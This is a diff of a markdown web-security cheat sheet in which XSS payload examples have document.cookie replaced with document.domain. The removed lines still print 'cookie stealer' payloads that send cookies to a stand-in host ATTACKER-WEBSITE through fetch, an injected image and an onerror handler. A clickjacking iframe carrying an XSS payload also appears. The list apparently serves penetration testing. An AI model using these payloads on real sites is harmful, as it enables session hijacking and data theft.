@@ -1011,17 +1011,17 @@ Manually testing for XXE vulnerabilities generally involves
   ```
 - Cookie stealers
   - ```JavaScript
-    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
+    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.domain});
     ```
   - ```JavaScript
-    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
+    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.domain + '\" />')
     ```
   - ```HTML
-    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
+    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.domain;>
     ```
  - onbeforeinput + contenteditable
    ```JavaScript
-   %22%20onbeforeinput=alert(document.cookie)%20contenteditable%20alt=%22
+   %22%20onbeforeinput=alert(document.domain)%20contenteditable%20alt=%22
    ```
  - ```JavaScript
    1672&81782%26apos%3b%3balert(%26apos%3bXSS%26apos%3b)%2f%2f232=1
@@ -1160,7 +1160,7 @@ Manually testing for XXE vulnerabilities generally involves
   }
 </style>
 <div>Click me</div>
-<iframe src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker.website.com&subject=test&message=test#feedbackResult"></iframe>
+<iframe src="$url?name=<img src=1 onerror=alert(document.domain)>&email=hacker@attacker.website.com&subject=test&message=test#feedbackResult"></iframe>
 ```
 
 
